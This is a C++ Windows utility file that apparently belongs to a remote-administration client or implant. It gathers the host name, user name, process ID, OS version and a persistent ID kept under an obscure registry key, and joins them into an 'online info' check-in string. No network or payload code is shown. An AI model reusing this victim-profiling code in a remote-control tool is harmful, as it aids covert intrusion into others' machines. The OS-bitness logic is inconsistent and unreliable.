#include "utils.h"
#define REG_TS       L"Software\\CLASSES\\DE"
#define REG_VER      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
bool g_isadmin = true;
std::string UtGetId()
{
	return std::to_string(GetClassId());
}


std::string UtGetOnlineInfo(std::string lanip)
{
    return UtGetId() + "\t" + UtGetSid() + "\t" + UtGetHostName() + "\t" + lanip + "\t" + UtGetUserName() + "\t" + UtGetPid() + "\t" + UtGetOs() + "\t" + UtOsType() + "\t" + UtOsBits();
}

DWORD GetClassId() {

	static DWORD clsid = 0;

	if (clsid)
	{
		return clsid;
	}

	int cb;

	if (!RegGetData(HKEY_LOCAL_MACHINE, REG_TS, L"ID", (PBYTE)&clsid, sizeof(DWORD), cb))
		if (!RegGetData(HKEY_CURRENT_USER, REG_TS, L"ID", (PBYTE)&clsid, sizeof(DWORD), cb))
		{
			clsid = getRandom();

			if (!RegSetData(HKEY_LOCAL_MACHINE, REG_TS, L"ID", (PBYTE)&clsid, sizeof(DWORD), REG_DWORD))
				if (!RegSetData(HKEY_CURRENT_USER, REG_TS, L"ID", (PBYTE)&clsid, sizeof(DWORD), REG_DWORD))
				{

				}
		}

	return clsid;
}

BOOL RegGetData(HKEY hroot,const wchar_t* path,const wchar_t* name, PBYTE data, int size, int& cb)
{
	HKEY hkey;

	if (RegOpenKeyExW(hroot, path, 0, KEY_READ, &hkey))
	{
		return FALSE;
	}

	if (RegQueryValueExW(hkey, name, NULL, NULL, data, (LPDWORD)&size))
	{
		RegCloseKey(hkey);
		return FALSE;
	}

	RegCloseKey(hkey);

	cb = size;

	return TRUE;
}

BOOL RegSetData(HKEY hroot,const wchar_t* path,const wchar_t* name, PBYTE data, int size, DWORD dwtype)
{
	HKEY hkey;

	if (RegCreateKeyExW(hroot, path, 0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL))
	{
		return FALSE;
	}

	if (RegSetValueExW(hkey, name, 0, dwtype, data, size))
	{
		RegCloseKey(hkey);
		return FALSE;
	}

	RegCloseKey(hkey);

	return TRUE;
}

DWORD getRandom()
{
	LARGE_INTEGER counter;

	QueryPerformanceCounter(&counter);

	static DWORD sand = 0;

	sand = (sand << 7) - sand + counter.HighPart;
	sand = (sand >> 3) + sand + counter.LowPart;

	return sand;
}

std::string UtGetSid()
{
	return UtGetId() + (g_isadmin ? "" : UtGetPid());
}

std::string UtGetPid()
{
	return std::to_string(GetCurrentProcessId());
}

std::string UtGetHostName()
{
	DWORD hostnamelen = MAX_PATH;
	wchar_t hostname[MAX_PATH] = { 0 };

	GetComputerNameW(hostname, &hostnamelen);

	std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;

	return converter.to_bytes(hostname);
}

std::string UtGetUserName()
{
	DWORD usernamelen = MAX_PATH;
	wchar_t username[MAX_PATH] = { 0 };

	GetUserNameW(username, &usernamelen);

	std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;

	return converter.to_bytes(username);
}

std::string UtGetOs()
{
	int b;
	std::string str;
	b = 1;
	if (IsWow64())
	{
		if (!b)
		{
			str = "(x64)";
		}
		else
		{
			str = "(x86)";
		}
	}
	else
	{
		if (b)
		{
			str = "(x64)";
		}
		else
		{
			str = "(x86)";
		}
	}

	int cb = 0;

	wchar_t wOs[MAX_PATH] = { 0 };

	if (!RegGetData(HKEY_LOCAL_MACHINE, REG_VER, L"ProductName", (PBYTE)wOs, MAX_PATH * 2, cb))
	{
		return "***" + str;
	}

	std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;

	return converter.to_bytes(wOs) + str;
}

BOOL IsWow64()
{
	BOOL WOW64 = FALSE;

	typedef BOOL(WINAPI* FN_IsWow64Process)(HANDLE hProcess, PBOOL Wow64Process);

	static FN_IsWow64Process IsWow64Process = NULL;

	if (IsWow64Process == NULL)
	{
		IsWow64Process = (FN_IsWow64Process)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
	}

	if (IsWow64Process)
	{
		if (!IsWow64Process(GetCurrentProcess(), (PBOOL)&WOW64))
		{
			WOW64 = FALSE;
		}
	}
	else
	{
		WOW64 = FALSE;
	}

	return WOW64;
}

std::string UtOsType()
{
	return "windows";
}

std::string UtOsBits()
{
	std::string str;

	str = "x64";

	return str;
}


